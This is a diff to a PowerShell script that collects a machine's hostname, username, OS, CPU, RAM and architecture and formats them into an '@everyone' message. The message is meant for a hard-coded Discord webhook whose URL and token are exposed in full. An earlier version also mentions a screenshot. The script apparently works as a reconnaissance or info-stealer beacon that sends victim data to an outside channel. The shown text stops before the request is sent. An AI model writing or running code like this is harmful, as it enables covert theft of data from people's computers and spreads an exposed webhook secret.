@@ -1,30 +1,37 @@
 $webhookUrl = "https://discord.com/api/webhooks/1324111050462990409/2W_0PApeT1jCSsIdg5wAM2z2gmvgTYbDEugbL6qhgRTLosR7QWzlHAtxck0XrkrNFDI2"
+
 Function Get-SystemInfo {
     $hostname = $env:COMPUTERNAME
     $username = $env:USERNAME
     $os = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption
+    $cpu = (Get-CimInstance -ClassName Win32_Processor).Name
+    $ram = [math]::round((Get-CimInstance -ClassName Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
+    $architecture = (Get-CimInstance -ClassName Win32_OperatingSystem).OSArchitecture
 
     return @{
-        Hostname  = $hostname
-        Username  = $username
-        OS        = $os
+        Hostname      = $hostname
+        Username      = $username
+        OS            = $os
+        CPU           = $cpu
+        RAM           = $ram
+        Architecture  = $architecture
     }
 }
 
 $systemInfo = Get-SystemInfo
 
+$plaintextMessage = @"
+**System Information**
+- **Hostname**: $($systemInfo.Hostname)
+- **Username**: $($systemInfo.Username)
+- **OS**: $($systemInfo.OS)
+- **CPU**: $($systemInfo.CPU)
+- **RAM**: $($systemInfo.RAM) GB
+- **Architecture**: $($systemInfo.Architecture)
+"@
+
 $jsonPayload = @{
-    content = "@everyone System Information and Screenshot"
-    embeds = @(
-        @{
-            title = "System Information"
-            fields = @(
-                @{name = "Hostname"; value = $systemInfo.Hostname; inline = $true},
-                @{name = "Username"; value = $systemInfo.Username; inline = $true},
-                @{name = "OS"; value = $systemInfo.OS; inline = $false}
-            )
-        }
-    )
+    content = "@everyone System Information: $plaintextMessage"
 } | ConvertTo-Json -Depth 10 -Compress
 
 Add-Type -AssemblyName "System.Net.Http"
